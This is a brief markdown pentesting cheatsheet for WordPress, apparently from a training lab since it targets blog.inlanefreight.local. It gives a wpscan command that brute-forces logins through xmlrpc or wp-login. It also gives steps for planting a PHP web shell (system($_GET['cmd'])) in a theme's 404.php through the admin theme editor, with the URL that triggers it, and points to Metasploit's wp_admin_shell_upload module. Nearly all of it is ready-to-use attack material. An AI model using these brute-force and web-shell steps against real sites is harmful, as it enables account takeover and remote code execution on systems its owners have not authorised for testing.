# Cheatsheet


| ***Command***                                                                                                                                                                                                                                                                                                                  | ***Usage***                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `sudo wpscan --password-attack xmlrpc -t <number-threads> -U <username> -P <wordlist> --url http://blog.inlanefreight.local`                                                                                                                                                                                                   | Brute-Forcing login.<br><br>`xmlrpc` brute forces the WordPress API. <br>`wp-login` brute forces the login page. |
| 1. Click on `Appearance` on the side panel and select Theme Editor.<br><br>2. Click on `Select` after selecting the theme.<br><br>3. Edit an uncommon page such as `404.php` to add a web shell. Example: `system($_GET['cmd']);`<br><br>4. Save and visit:<br>`http://<url>/wp-content/themes/<theme-name>/<page.php>?cmd=id` | Performing Code Execution through an **admin** account.                                                          |
| [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) from metasploit                                                                                                                                                                                                          |                                                                                                                  |
# Related Pages

[WordPress Enumeration](I.%20Enumeration/Web%20Enumeration/Common%20WebApps/WordPress%20Enumeration.md): To analyze the attack surface. Enumerate plugins and themes carefully.

